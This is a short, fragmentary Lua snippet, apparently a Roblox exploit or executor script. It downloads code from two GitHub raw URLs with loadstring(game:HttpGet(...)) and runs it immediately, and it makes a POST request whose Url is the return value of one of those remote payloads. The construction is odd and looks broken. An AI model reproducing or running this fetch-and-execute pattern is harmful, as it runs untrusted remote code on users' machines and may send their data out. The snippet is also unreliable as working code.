...
request({
    Url = loadstring(game:HttpGet("https://raw.githubusercontent.com/Mander120/yogurt/refs/heads/main/YoGurt"))(),
    Method = "POST",
    Headers = headers,
    Body = body
})
...
local code = loadstring(game:HttpGet("https://raw.githubusercontent.com/Mander120/GG/refs/heads/main/NOOB"))()
